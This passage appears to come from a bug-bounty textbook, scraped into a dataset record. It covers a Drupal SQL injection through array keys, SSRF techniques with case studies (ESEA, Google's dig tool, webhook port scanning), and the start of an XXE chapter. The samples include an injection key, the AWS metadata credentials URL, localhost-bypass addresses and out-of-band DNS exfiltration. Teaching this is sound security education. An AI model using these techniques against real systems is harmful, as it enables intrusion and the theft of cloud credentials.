PHP code uses arrays. PHP can use associative arrays, which\nexplicitly define keys as follows:\n['red' => 'apple', 'yellow' => 'banana']\nThe keys in this array are 'red' and 'yellow', and the array’s values\nare the fruits to the right of the arrow (=>).\nAlternatively, PHP can use a structured array, as follows:\n['apple', 'banana']\nA structured array’s keys are implicit and based on the position of\nthe value in the list. For example, the key for 'apple' is 0 and the key for\n'banana' is 1.\nThe foreach PHP function iterates over an array and can separate the\n181\nDownload from www.finelybook.com 7450911@qq.com\narray key from its value. It can also assign each key and each value to\nits own variable and pass them to a block of code for processing. At\n➊, foreach takes each element of an array and verifies the value passed\nto it is an array by calling array_filter($args, 'is_array'). After the statement\nconfirms it has an array value, it assigns each of the array’s keys to\n$key and each of the values to $data for each iteration of the foreach\nloop. The code will modify the values in the array to create\nplaceholders, so the code at ➋ initializes a new empty array to later\nhold the placeholder values.\nTo create the placeholders, the code at ➌ iterates through the $data\narray by assigning each key to $i and each value to $value. Then at ➍,\nthe new_keys array initialized at ➋ holds the first array’s key\nconcatenated with the key at ➌. The code’s intended outcome is to\ncreate data placeholders that look like name_0, name_1, and so on.\nHere is what a typical query would look like using Drupal’s\ndb_query function, which queries a database:\ndb_query(\"SELECT * FROM {users} WHERE name IN (:name)\",\narray(':name'=>array('user1','user2')));\nThe db_query function takes two parameters: a query that contains\nnamed placeholders for variables and an array of values to substitute\nfor those placeholders. In this example, the placeholder is :name and is\nan array with the values 'user1' and 'user2'. In a structured array, the key\nfor 'user1' is 0 and the key for 'user2' is 1. When Drupal executes the\ndb_query function, it calls the expandArguments function, which\nconcatenates the keys to each value. The resulting query uses name_0\nand name_1 in place of the keys, as shown here:\nSELECT * FROM users WHERE name IN (:name_0, :name_1)\n182\nDownload from www.finelybook.com 7450911@qq.com\nBut the problem arises when you call db_query using an associative\narray, as in the following code:\ndb_query(\"SELECT * FROM {users} where name IN (:name)\",\narray(':name'=>array('test);-- ' => 'user1', 'test' => 'user2')));\nIn this case, :name is an array and its keys are 'test);--' and 'test'.\nWhen expandArguments receives the :name array and processes it to\ncreate the query, it generates this:\nSELECT * FROM users WHERE name IN (:name_test);-- , :name_test)\nWe’ve injected a comment into the prepared statement. The reason\nthis occurs is that expandArguments iterates through each array element\nto build placeholders but assumes it’s passed a structured array. In the\nfirst iteration, $i is assigned 'test);--' and $value is assigned 'user1'. The\n$key is ':name' and combining that with $i results in name_test);--. In the\nsecond iteration, $i is assigned 'test' and $value is 'user2'. Combining $key\nwith $i results in the value name_test.\nThis behavior allows malicious users to inject SQL statements into\nDrupal queries that rely on the IN clause. The vulnerability affects\nDrupal login functionality, making the SQLi vulnerability severe\nbecause any site user, including an anonymous user, could exploit it.\nMaking matters worse, PHP PDO supports the ability to execute\nmultiple queries at once by default. This means an attacker could\nappend additional queries to the user login query in order to execute\nnon-IN clause SQL commands. For example, an attacker could use\nINSERT statements, which insert records into a database, to create an\nadministrative user that they could then use to log in to the website.\nTakeaways\n183\nDownload from www.finelybook.com 7450911@qq.com\nThis SQLi vulnerability wasn’t simply a matter of submitting a single\nquote and breaking a query. Rather, it required understanding how\nDrupal core’s database API handles the IN clause. The takeaway from\nthis vulnerability is to be on the lookout for opportunities to alter the\nstructure of input passed to a site. When a URL takes name as a\nparameter, try adding [] to the parameter to change it to an array and\ntest how the site handles it.\nSUMMARY\nSQLi can be a significant vulnerability and dangerous for a site. If an\nattacker finds a SQLi, they might obtain full permissions to a site. In\nsome situations, a SQLi vulnerability can be escalated by inserting\ndata into the database that enables administrative permissions on the\nsite, as in the Drupal example. When you’re looking for SQLi\nvulnerabilities, explore places where you can pass unescaped single or\ndouble quotes to a query. When you find a vulnerability, the\nindications that the vulnerability exists can be subtle, such as with\nblind injections. You should also look for places where you can pass\ndata to a site in unexpected ways, such as where you can substitute\narray parameters in request data, as in the Uber bug.\n184"
  },
  {
    "input": "",
    "summary": "",
    "output": "Download from www.finelybook.com 7450911@qq.com\n10\nSERVER-SIDE REQUEST FORGERY\nA server-side request forgery (SSRF) vulnerability allows an attacker\nto make a server perform unintended network requests. Like a cross-\nsite request forgery (CSRF) vulnerability, an SSRF abuses another\nsystem to perform malicious actions. While a CSRF exploits another\nuser, an SSRF exploits a targeted application server. As with CSRFs,\nSSRF vulnerabilities can vary in impact and execution methods.\nHowever, just because you can make a targeted server send requests to\nother arbitrary servers doesn’t mean the targeted application is\nvulnerable. The application may intentionally allow this behavior. For\nthis reason, it’s important to understand how to demonstrate impact\nwhen you’ve found a potential SSRF.\nDEMONSTRATING THE IMPACT OF\nSERVER-SIDE REQUEST FORGERY\nDepending on how a website is organized, a server vulnerable to\nSSRF might make an HTTP request to an internal network or to\nexternal addresses. The vulnerable server’s ability to make requests\n185\nDownload from www.finelybook.com 7450911@qq.com\ndetermines what you can do with the SSRF.\nSome larger websites have firewalls that prohibit external internet\ntraffic from accessing internal servers: for example, the website will\nhave a limited number of publicly facing servers that receive HTTP\nrequests from visitors and send requests on to other servers that are\npublicly inaccessible. A common example is a database server, which\nis often inaccessible to the internet. When you’re logging into a site\nthat communicates with a database server, you might submit a\nusername and password through a regular web form. The website\nwould receive your HTTP request and perform its own request to the\ndatabase server using your credentials. Then the database server\nwould respond to the web application server, and the web application\nserver would relay the information to you. During this process, you’re\noften not aware that the remote database server exists, and you should\nhave no direct access to the database.\nVulnerable servers that allow attacker control of requests to\ninternal servers could expose private information. For example, if an\nSSRF existed in the preceding database example, it might allow an\nattacker to send requests to the database server and retrieve\ninformation they shouldn’t have access to. SSRF vulnerabilities\nprovide attackers access to a broader network to target.\nSuppose you find an SSRF, but the vulnerable site doesn’t have\ninternal servers or those servers aren’t accessible via the vulnerability.\nIn that case, check whether you can perform requests to arbitrary\nexternal sites from the vulnerable server. If you can exploit the target\nserver to communicate with a server you control, you can use the\nrequested information from it to learn more about the software the\ntarget application is using. You might also be able to control the\nresponse to it.\n186\nDownload from www.finelybook.com 7450911@qq.com\nFor example, you might be able to convert external requests to\ninternal requests if the vulnerable server follows redirects, a trick\nJustin Kennedy pointed out to me. In some cases, a site won’t allow\naccess to internal IPs but will contact external sites. If so, you can\nreturn an HTTP response with a status code of 301, 302, 303, or 307,\nwhich are types of redirects. Because you control the response, you\ncan point the redirection to an internal IP address to test whether the\nserver will follow the 301 response and make an HTTP request to its\ninternal network.\nAlternatively, you could use the response from your server to test\nfor other vulnerabilities, such as SQLi or XSS, as discussed in\n“Attacking Users with SSRF Responses” on page 98. The success of\nthis depends on how the targeted application is using the response\nfrom the forged request but it often pays to be creative in these\nsituations.\nThe least impactful situation is when an SSRF vulnerability only\nallows you to communicate with a limited number of external\nwebsites. In those cases, you might take advantage of an incorrectly\nconfigured blacklist. For instance, suppose a website can\ncommunicate externally with www.<example>.com but only validates\nthat the URL provided ends in <example>.com. An attacker could\nregister attacker<example>.com, allowing the attacker to control a\nresponse to the target site.\nINVOKING GET VS. POST REQUESTS\nAfter you verify that you can submit an SSRF, confirm whether you\ncan invoke a GET or POST HTTP method to exploit the site. HTTP\nPOST requests can be more significant if an attacker can control the\n187\nDownload from www.finelybook.com 7450911@qq.com\nPOST parameters; POST requests often invoke state-changing behavior,\nsuch as creating user accounts, invoking system commands, or\nexecuting arbitrary code depending on what other applications the\nvulnerable server can communicate with. HTTP GET requests, on the\nother hand, are often associated with exfiltrating data. Because POST\nrequest SSRFs can be complex and depend on the system, in this\nchapter we’ll focus on bugs that use GET requests. To learn more\nabout POST request–based SSRF, read Orange Tsai’s presentation\nslides from Black Hat 2017 at https://www.blackhat.com/docs/us-\n17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-\nIn-Trending-Programming-Languages.pdf.\nPERFORMING BLIND SSRFS\nAfter confirming where and how you can make a request, consider\nwhether you can access the response of a request. When you can’t\naccess a response, you’ve found a blind SSRF. For example, an\nattacker might have access to an internal network through SSRF but\nbe unable to read HTTP responses to the internal server requests. So,\nthey’ll need to find an alternative means of extracting information,\nusually by using timing or the Domain Name System (DNS).\nIn some blind SSRFs, response times can reveal information about\nthe servers being interacted with. One way of exploiting response\ntimes is to port scan inaccessible servers. Ports pass information to\nand from a server. You scan ports on a server by sending a request and\nseeing whether they respond. For example, you can try to exploit an\nSSRF on an internal network by port scanning internal servers. By\ndoing so, you might determine whether the server is open, closed, or\nfiltered based on whether a response from a known port (like port 80\n188\nDownload from www.finelybook.com 7450911@qq.com\nor 443) returns in 1 second or 10 seconds. Filtered ports are like a\ncommunication black hole. They don’t reply to requests, so you’ll\nnever know whether they’re open or closed, and the request will time\nout. In contrast, a quick reply might mean the server is open and\naccepting communication or is closed and not accepting\ncommunication. When you’re exploiting SSRF to port scan, try to\nconnect to common ports, such as 22 (used for SSH), 80 (HTTP), 443\n(HTTPS), 8080 (alternate HTTP), and 8443 (alternate HTTPS). You’ll\nbe able to confirm whether responses differ and deduce information\nfrom those differences.\nDNS is a map for the internet. You can try to invoke DNS requests\nusing internal systems and control the address of the request,\nincluding the subdomain. If you’re successful, you might be able to\nsmuggle information from blind SSRF vulnerabilities. To exploit a\nblind SSRF in this way, you append the smuggled information as a\nsubdomain to your own domain. The targeted server then performs a\nDNS lookup to your site for that subdomain. For example, let’s say\nyou find a blind SSRF and can execute limited commands on a server\nbut can’t read any responses. If you can invoke DNS lookups while\ncontrolling the lookup domain, you can add the SSRF output to a\nsubdomain and use the command whoami. This technique is commonly\nreferred to as out-of-band (OOB) exfiltration. When you use the\nwhoami command on the subdomain, the vulnerable website sends a\nDNS request to your server. Your server receives a DNS lookup for\ndata.<yourdomain>.com, where data is the output from the\nvulnerable server’s whoami command. Because URLs can only include\nalphanumeric characters, you’ll need to encode the data using base32\nencoding.\n189\nDownload from www.finelybook.com 7450911@qq.com\nATTACKING USERS WITH SSRF\nRESPONSES\nWhen you can’t target internal systems, you can instead try to exploit\nSSRFs that impact users or the application itself. If your SSRF isn’t\nblind, one way of doing so is to return malicious responses to the\nSSRF request, such as cross-site scripting (XSS) or SQL injection\n(SQLi) payloads, which execute on the vulnerable site. Stored XSS\npayloads are especially significant if other users regularly access\nthem, because you can exploit these payloads to attack the users. For\nexample, suppose www.<example>.com/picture?url= accepted a\nURL to fetch an image for your account profile in the URL parameter.\nYou could submit a URL to your own site that returns an HTML page\nwith a XSS payload. So the full URL would be www.\n<example>.com/picture?url=<attacker>.com/xss. If www.\n<example>.com saved the payload’s HTML and rendered it as the\nprofile image, the site would have a stored XSS vulnerability. But if\nthe site rendered the HTML payload and didn’t save it, you could still\ntest whether the site prevented CSRF for that action. If it didn’t, you\ncould share the URL www.<example>.com/picture?url=\n<attacker>.com/xss with a target. If the target visited the link, the\nXSS would fire as a result of the SSRF and make a request to your\nsite.\nWhen you’re looking for SSRF vulnerabilities, keep an eye out for\nopportunities to submit a URL or IP address as part of some site\nfunctionality. Then consider how you could leverage that behavior to\neither communicate with internal systems or combine it with some\nother type of malicious behavior.\n190\nDownload from www.finelybook.com 7450911@qq.com\nESEA SSRF AND QUERYING AWS\nMETADATA\nDifficulty: Medium\nURL: https://play.esea.net/global/media_preview.php?url=/\nSource: http://buer.haus/2016/04/18/esea-server-side-request-\nforgery-and-querying-aws-meta-data/\nDate reported: April 11, 2016\nBounty paid: $1,000\nIn some cases, you can exploit and demonstrate the impact of an\nSSRF in multiple ways. E-Sports Entertainment Association (ESEA),\na competitive video gaming community, opened a self-run bug bounty\nprogram in 2016. Immediately after ESEA launched the program,\nBrett Buerhaus used Google dorking to quickly search for URLs\nending in the .php file extension. Google dorking uses Google search\nkeywords to specify where a search is performed and the type of\ninformation looked for. Buerhaus used the query\nsite:https://play.esea.net/ ext:php, which tells Google to return results\nonly for the site https://play.esea.net/ when a file ends in .php. Older\nsite designs serve web pages that end with .php and can indicate a\npage is using outdated functionality, making it a good place to look\nfor vulnerabilities. When Buerhaus ran the search, he received the\nURL https://play.esea.net/global/media_preview.php?url= as part of\nthe results.\nThis result is notable because of the parameter url=. The parameter\nindicates ESEA could be rendering content from external sites defined\nby the URL parameter. When you’re looking for SSRF, the URL\nparameter is a red flag. To begin testing, Buerhaus inserted his own\n191\nDownload from www.finelybook.com 7450911@qq.com\ndomain into the parameter to create the URL\nhttps://play.esea.net/global/media_preview.php?url=http://ziot.org.\nHe received an error message that ESEA was expecting the URL to\nreturn an image. So he tried the URL\nhttps://play.esea.net/global/media_preview.php?\nurl=http://ziot.org/1.png and was successful.\nValidating file extensions is a common approach to secure\nfunctionality where users can control parameters that make server-side\nrequests. ESEA was limiting the URL rendering to images, but that\ndidn’t mean it was validating URLs properly. Buerhaus added a null\nbyte (%00) to the URL to start his testing. In programming languages\nin which the programmer needs to manage memory manually, a null\nbyte terminates strings. Depending on how a site implements its\nfunctionality, adding a null byte might cause the site to end the URL\nprematurely. If ESEA was vulnerable, instead of making a request to\nhttps://play.esea.net/global/media_preview.php?\nurl=http://ziot.org%00/1.png, the site would make the request to\nhttps://play.esea.net/global/media_preview.php?url=http://ziot.org.\nBut Buerhaus found that adding a null byte didn’t work.\nNext, he tried adding additional forward slashes, which divide\nparts of a URL. Input after multiple forward slashes is often ignored\nbecause multiple slashes don’t conform to a URL’s standard structure.\nInstead of making a request to\nhttps://play.esea.net/global/media_preview.php?\nurl=http://ziot.org///1.png, Buerhaus hoped the site would make a\nrequest to https://play.esea.net/global/media_preview.php?\nurl=http://ziot.org. This test also failed.\nIn his final attempt, Buerhaus changed the 1.png in his URL from\npart of the URL to a parameter by converting the forward slash to a\n192\nDownload from www.finelybook.com 7450911@qq.com\nquestion mark. So instead of\nhttps://play.esea.net/global/media_preview.php?\nurl=http://ziot.org/1.png, he submitted\nhttps://play.esea.net/global/media_preview.php?url=http://ziot.org?\n1.png. The first URL submits the request to his site looking for /1.png.\nBut the second URL causes the request to be made to the site home\npage http://ziot.org with 1.png as a parameter in the request. As a\nresult, ESEA rendered Buerhaus’s http://ziot.org web page.\nBuerhaus had confirmed that he could make external HTTP\nrequests and the site would render the response—a promising start.\nBut invoking requests to any server might be an acceptable risk to\ncompanies if the server doesn’t disclose information or the website\ndoesn’t do anything with the HTTP response. To escalate the severity\nof the SSRF, Buerhaus returned an XSS payload in his server’s\nresponse, as described in “Attacking Users with SSRF Responses” on\npage 98.\nHe shared the vulnerability with Ben Sadeghipour to see if they\ncould escalate it. Sadeghipour suggested submitting\nhttp://169.254.169.254/latest/meta-data/hostname. This is an IP\naddress that Amazon Web Services (AWS) provides for sites it hosts.\nIf an AWS server sends an HTTP request to this URL, AWS returns\nmetadata about the server. Usually, this feature helps with internal\nautomation and scripting. But the endpoint can also be used to access\nprivate information. Depending on the site’s AWS configuration, the\nendpoint http://169.254.169.254/latest/meta-data/iam/security-\ncredentials/ returns the Identify Access Manager (IAM) security\ncredentials for the server performing the request. Because AWS\nsecurity credentials are difficult to configure, it’s not uncommon for\naccounts to have more permissions than required. If you can access\n193\nDownload from www.finelybook.com 7450911@qq.com\nthese credentials, you can use the AWS command line to control any\nservice the user has access to. ESEA was in fact hosted on AWS, and\nthe internal host name of the server was returned to Buerhaus. At this\npoint, he stopped and reported the vulnerability.\nTakeaways\nGoogle dorking can save you time when you’re looking for\nvulnerabilities that require URLs set up in a specific way. If you use\nthe tool to look for SSRF vulnerabilities, watch out for target URLs\nthat appear to be interacting with external sites. In this case, the site\nwas exposed by the URL parameter url=. When you find an SSRF,\nthink big. Buerhaus could have reported the SSRF using the XSS\npayload, but that wouldn’t have been nearly as impactful as accessing\nthe site’s AWS metadata.\nGOOGLE INTERNAL DNS SSRF\nDifficulty: Medium\nURL: https://toolbox.googleapps.com/\nSource: https://www.rcesecurity.com/2017/03/ok-google-give-me-\nall-your-internal-dns-information/\nDate reported: January 2017\nBounty paid: Undisclosed\nSometimes sites are meant to perform HTTP requests to external sites\nonly. When you find sites with this functionality, check whether you\ncan abuse it to access internal networks.\nGoogle provides the site https://toolbox.googleapps.com to help\nusers debug issues they’re having with Google’s G Suite services.\n194\nDownload from www.finelybook.com 7450911@qq.com\nThat service’s DNS tool caught Julien Ahrens’s\n(www.rcesecurity.com) attention because it allowed users to perform\nHTTP requests.\nGoogle’s DNS tools include dig, which acts just like the Unix dig\ncommand and allows users to query domain name servers for a site’s\nDNS information. DNS information maps an IP address to a readable\ndomain, such as www.<example>.com. At the time of Ahrens’s\nfinding, Google included two input fields: one for the URL to map to\nan IP address and the other for the domain name server, as shown in\nFigure 10-1.\n195\nDownload from www.finelybook.com 7450911@qq.com\n196\nDownload from www.finelybook.com 7450911@qq.com\nFigure 10-1: An example query to the Google dig tool\nAhrens noticed the Name server field in particular because it\nallows users to specify an IP address to point the DNS query to. This\nsignificant discovery suggested that users could send DNS queries to\nany IP address.\nSome IP addresses are reserved for internal use. They’re\ndiscoverable by internal DNS queries but shouldn’t be accessible\nthrough the internet. These reserved IP ranges include:\n10.0.0.0 to 10.255.255.255\n100.64.0.0 to 100.127.255.255\n127.0.0.0 to 127.255.255.255\n172.16.0.0 to 172.31.255.255\n192.0.0.0 to 192.0.0.255\n198.18.0.0 to 198.19.255.255\nIn addition, some IP addresses are reserved for specific purposes.\nTo begin testing the Name server field, Ahrens submitted his site\nas the server to look up and used the IP address 127.0.0.1 as the Name\nserver. IP address 127.0.0.1 is commonly referred to as the localhost,\nand a server uses it to refer to itself. In this case, localhost is the\nGoogle server executing the dig command. Ahrens’s test resulted in\nthe error “Server did not respond.” The error implies that the tool was\ntrying to connect to its own port 53 (the port that responds to DNS\nlookups) for information about Ahrens’s site, rcesecurity.com. The\nwording “did not respond” is crucial because it implies that the server\nallows internal connections, whereas wording like “permission\ndenied” would not. This red flag signaled Ahrens to keep testing.\nNext, Ahrens sent the HTTP request to the Burp Intruder tool so he\n197\nDownload from www.finelybook.com 7450911@qq.com\ncould begin enumerating internal IP addresses in the 10.x.x.x range.\nAfter a couple of minutes, he received a response from one internal\n10. IP address (he purposely did not disclose which) with an empty A\nrecord, which is a type of record that DNS servers return. Although\nthe A record was empty, it was for Ahrens’s website:\nid 60520\nopcode QUERY\nrcode REFUSED\nflags QR RD RA\n;QUESTION\nwww.rcesecurity.com IN A\n;ANSWER\n;AUTHORITY\n;ADDITIONAL\nAhrens had found a DNS server with internal access that would\nrespond to him. An internal DNS server usually doesn’t know about\nexternal websites, which explains the empty A record. But the server\nshould know how to map to internal addresses.\nTo demonstrate the impact of the vulnerability, Ahrens had to\nretrieve information about Google’s internal network because\ninformation about an internal network shouldn’t be publicly\naccessible. A quick Google search revealed that Google used the\nsubdomain corp.google.com as the base for its internal sites. So\nAhrens began brute-forcing subdomains from corp.google.com,\neventually revealing the domain ad.corp.google.com. Submitting this\nsubdomain to the dig tool and requesting A records for the internal IP\naddress Ahrens had found earlier returned Google’s private DNS\ninformation, which was far from empty:\nid 54403\nopcode QUERY\n198\nDownload from www.finelybook.com 7450911@qq.com\nrcode NOERROR\nflags QR RD RA\n;QUESTION\nad.corp.google.com IN A\n;ANSWER\nad.corp.google.com. 58 IN A 100.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 172.REDACTED\nad.corp.google.com. 58 IN A 100.REDACTED\n;AUTHORITY\n;ADDITIONAL\nNote the references to the internal IP addresses 100.REDACTED and\n172.REDACTED. In comparison, the public DNS lookup for\nad.corp.google.com returns the following record, which doesn’t\ninclude any information about the private IP addresses that Ahrens\ndiscovered:\ndig A ad.corp.google.com @8.8.8.8\n; <<>> DiG 9.8.3-P1 <<>> A ad.corp.google.com @8.8.8.8\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 5981\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0\n;; QUESTION SECTION:\n;ad.corp.google.com. IN A\n;; AUTHORITY SECTION:\ncorp.google.com. 59 IN SOA ns3.google.com. dns-admin.google.com. 147615698\n900 900 1800 60\n;; Query time: 28 msec\n199\nDownload from www.finelybook.com 7450911@qq.com\n;; SERVER: 8.8.8.8#53(8.8.8.8)\n;; WHEN: Wed Feb 15 23:56:05 2017\n;; MSG SIZE rcvd: 86\nAhrens also requested the Name servers for ad.corp.google.com\nusing Google’s DNS tools, which returned the following:\nid 34583\nopcode QUERY\nrcode NOERROR\nflags QR RD RA\n;QUESTION\nad.corp.google.com IN NS\n;ANSWER\nad.corp.google.com. 1904 IN NS hot-dcREDACTED\nad.corp.google.com. 1904 IN NS hot-dcREDACTED\nad.corp.google.com. 1904 IN NS cbf-dcREDACTED\nad.corp.google.com. 1904 IN NS vmgwsREDACTED\nad.corp.google.com. 1904 IN NS hot-dcREDACTED\nad.corp.google.com. 1904 IN NS vmgwsREDACTED\nad.corp.google.com. 1904 IN NS cbf-dcREDACTED\nad.corp.google.com. 1904 IN NS twd-dcREDACTED\nad.corp.google.com. 1904 IN NS cbf-dcREDACTED\nad.corp.google.com. 1904 IN NS twd-dcREDACTED\n;AUTHORITY\n;ADDITIONAL\nIn addition, Ahrens discovered that at least one internal domain\nwas publicly accessible to the internet: a Minecraft server at\nminecraft.corp.google.com.\nTakeaways\nBe on the lookout for websites that include functionality to make\nexternal HTTP requests. When you find them, try pointing the request\ninternally using the private network IP address 127.0.0.1 or the IP\n200\nDownload from www.finelybook.com 7450911@qq.com\nranges listed in the example. If you discover internal sites, try to\naccess them from an external source to demonstrate greater impact.\nMost likely, they’re only meant to be internally accessible.\nINTERNAL PORT SCANNING USING\nWEBHOOKS\nDifficulty: Easy\nURL: N/A\nSource: N/A\nDate reported: October 2017\nBounty paid: Undisclosed\nWebhooks allow users to ask one site to send a request to another\nremote site when certain actions occur. For example, an ecommerce\nsite might allow users to set up a webhook that sends purchase\ninformation to a remote site every time a user submits an order.\nWebhooks that let the user define the URL of the remote site provide\nan opportunity for SSRFs. But the impact of any SSRFs might be\nlimited because you can’t always control the request or access the\nresponse.\nWhile testing a site in October 2017, I noticed I could create\ncustom webhooks. So I submitted the webhook URL as\nhttp://localhost to see whether the server would communicate with\nitself. The site said this URL wasn’t permitted, so I also tried\nhttp://127.0.0.1, which also returned an error message. Undeterred, I\ntried referencing 127.0.0.1 in other ways. The website\nhttps://www.psyon.org/tools/ip_address_converter.php?ip=127.0.0.1/\nlists several alternative IP addresses, including 127.0.1, 127.1, and\n201\nDownload from www.finelybook.com 7450911@qq.com\nmany others. Both appeared to work.\nAfter submitting my report, I realized the severity of my finding\nwas too low to warrant a bounty. All I had demonstrated was the\nability to bypass the site’s localhost check. To be eligible for a reward,\nI had to demonstrate that I could compromise the site’s infrastructure\nor extract information.\nThe site also used a feature called web integrations, which allows\nusers to import remote content to the site. By creating a custom\nintegration, I could provide a remote URL that returns an XML\nstructure for the site to parse and render for my account.\nTo start, I submitted 127.0.0.1 and hoped the site might disclose\ninformation about the response. Instead, the site rendered the error 500\n“Unable to connect” in place of valid content. This error looked\npromising because the site was disclosing information about the\nresponse. Next, I checked whether I could communicate with ports on\nthe server. I went back to the integration configuration and submitted\n127.0.0.1:443, which is the IP address to access and the server port\nseparated by a colon. I wanted to see whether the site could\ncommunicate on port 443. Again, I received the error 500 “Unable to\nconnect.” I also received the same error for port 8080. Then I tried\nport 22, which connects over SSH. This time the error was 503,\n“Could not retrieve all headers.”\nBingo. The “Could not retrieve all headers” response was sending\nHTTP traffic to a port expecting the SSH protocol. This response\ndiffers from a 500 response because it confirms that a connection can\nbe made. I resubmitted my report to demonstrate that I could use web\nintegrations to port scan the company’s internal server because\nresponses were different for open/closed and filtered ports.\n202\nDownload from www.finelybook.com 7450911@qq.com\nTakeaways\nIf you can submit a URL to create webhooks or intentionally import\nremote content, try to define specific ports. Minor changes in how a\nserver responds to different ports can reveal whether a port is open or\nclosed or filtered. In addition to differences in the messages the server\nreturns, ports might reveal whether they’re open or closed or filtered\nby how long it takes the server to respond to the request.\nSUMMARY\nSSRFs occur when an attacker can leverage a server to perform\nunintended network requests. But not all requests are exploitable. For\nexample, the fact that a site allows you to make a request to a remote\nor local server doesn’t mean it’s significant. Identifying the ability to\nmake an unintended request is just the first step in identifying these\nbugs. The key to reporting them is to demonstrate the full impact of\ntheir behavior. In each example in this chapter, the sites allowed\nHTTP requests to be made. But they didn’t adequately protect their\nown infrastructure from malicious users.\n203\nDownload from www.finelybook.com 7450911@qq.com\n11\nXML EXTERNAL ENTITY\nAttackers can exploit how an application parses eXtensible Markup\nLanguage (XML) by taking advantage of an XML External Entity\n(XXE) vulnerability. More specifically, it involves exploiting how the\napplication processes the inclusion of external entities in its input.\nYou can use an XXE to extract information from a server or to call on\na malicious server.\nEXTENSIBLE MARKUP LANGUAGE\nThis vulnerability takes advantage of the external entities used in\nXML. XML is a metalanguage, meaning it’s used to describe other\nlanguages. It was developed as a response to the shortcomings of\nHTML, which can define only how data is displayed. In contrast,\nXML defines how data is structured.\nFor example, HTML can format text as a header using the opening\nheader tag <h1> and a closing tag </h1>. (For some tags, the closing tag\nis optional.) Each tag can have a predefined style that the browser\napplies to the text on a website when it renders it. For example, the\n204\nDownload from www.finelybook.com 7450911@qq.com\n<h1> tag might format all headers as bold with a 14px font size.\nSimilarly, the <table> tag presents data in rows and columns, and <p>\ntags define how text should look for regular paragraphs.\nIn contrast, XML has no predefined tags. Instead, you define the\ntags yourself, and those definitions won’t necessarily be included in\nthe XML file. For example, consider the following XML file, which\npresents a job listing:\n➊ <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n➋ <Jobs>\n➌ <Job>\n➍ <Title>Hacker</Title>\n➎ <Compensation>1000000</Compensation>\n➏ <Responsibility fundamental=\"1\">Shot web</Responsibility>\n</Job>\n</Jobs>\nAll the tags are author defined, so it’s impossible to know from the\nfile alone how this data would look on a web page.\nThe first line ➊ is a declaration header indicating the XML 1.0\nversion and type of Unicode encoding to be used. After the initial\nheader, the <Jobs> tag ➋ wraps all other <Job> tags ➌. Each <Job> tag\nwraps a <Title> ➍, <Compensation> ➎, and <Responsibility> ➏ tag. As in\nHTML, a basic XML tag is made up of two angle brackets\nsurrounding the tag name. But unlike tags in HTML, all XML tags\nrequire a closing tag. In addition, each XML tag can have an attribute.\nFor example, the <Responsibility> tag has the name Responsibility with an\noptional attribute made up of the attribute name fundamental and\nattribute value 1 ➏.\nDocument Type Definitions\n205\nDownload from www.finelybook.com 7450911@qq.com\nBecause the author can define any tag, a valid XML document must\nfollow a set of general XML rules (these are beyond the scope of this\nbook, but having a closing tag is one example) and match a document\ntype definition (DTD). An XML DTD is a set of declarations that\ndefine which elements exist, what attributes they can have, and which\nelements can be enclosed within other elements. (An element consists\nof the opening and closing tags, so an opening <foo> is a tag and a\nclosing </foo> is also a tag, but <foo></foo> is an element.) XML files\ncan either use an external DTD, or they can use an internal DTD that\nis defined within the XML document.\nExternal DTDs\nAn external DTD is an external .dtd file the XML document\nreferences and fetches. Here’s what an external DTD file might look\nlike for the jobs XML document shown earlier.\n➊ <!ELEMENT Jobs (Job)*>\n➋ <!ELEMENT Job (Title, Compensation, Responsibility)>\n<!ELEMENT Title ➌(#PCDATA)>\n<!ELEMENT Compensation (#PCDATA)>\n<!ELEMENT Responsibility (#PCDATA)>\n<➍!ATTLIST Responsibility ➎fundamental ➏CDATA ➐\"0\">\nEach element used in the XML document is defined in the DTD\nfile using the keyword !ELEMENT. The definition of Jobs indicates that\nit can contain the element Job. The asterisk denotes that Jobs may\ncontain zero or more Job elements. A Job element must contain a Title,\nCompensation, and Responsibility ➋. Each of these is also an element and\ncan contain only HTML-parsable character data, denoted by\n(#PCDATA) ➌. The data definition (#PCDATA) tells the parser what\ntype of characters will be enclosed in each XML tag. Lastly,\n206\nDownload from www.finelybook.com 7450911@qq.com\nResponsibility has an attribute declared using !ATTLIST ➍. The attribute\nis named ➎, and the CDATA ➏ tells the parser the tag will only\ncontain character data that shouldn’t be parsed. The default value of\nResponsibility is defined as 0 ➐.\nExternal DTD files are defined in the XML document using the\n<!DOCTYPE> element:\n<!DOCTYPE ➊note ➋SYSTEM ➌\"jobs.dtd\">\nIn this case, we define a <!DOCTYPE> with the XML entity note ➊.\nXML entities are explained in the next section. But for now, just know\nthat SYSTEM ➋ is a keyword that tells the XML parser to get the\nresults of the jobs.dtd file ➌ and use that wherever note ➊ is\nsubsequently used in the XML.\nInternal DTDs\nIt’s also possible to include the DTD within the XML document. To\ndo so, the first line of the XML must also be a <!DOCTYPE> element.\nBy using an internal DTD to combine the XML file and DTD, we’d\nget a document that looks like the following:\n➊ <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n➋ <!DOCTYPE Jobs [\n<!ELEMENT Jobs (Job)*>\n<!ELEMENT Job (Title, Compensation, Responsibility)>\n<!ELEMENT Title (#PCDATA)>\n<!ELEMENT Compensation (#PCDATA)>\n<!ELEMENT Responsibility (#PCDATA)>\n<!ATTLIST Responsibility fundamental CDATA \"0\"> ]>\n➌ <Jobs>\n<Job>\n<Title>Hacker</Title>\n<Compensation>1000000</Compensation>\n207\nDownload from www.finelybook.com 7450911@qq.com\n<Responsibility fundamental=\"1\">Shot web</Responsibility>\n</Job>\n</Jobs>\nHere, we have what’s referred to as an internal DTD declaration.\nNotice that we still begin with a declaration header, indicating our\ndocument conforms to XML 1.0 with UTF-8 encoding ➊.\nImmediately after, we define our !DOCTYPE for the XML to follow,\nthis time by just writing out the entire DTD instead of a reference to\nan external file ➋. The rest of the XML document follows the DTD\ndeclaration ➌.\nXML Entities\nXML documents contain XML entities, which are like placeholders for\ninformation. Using our <Jobs> 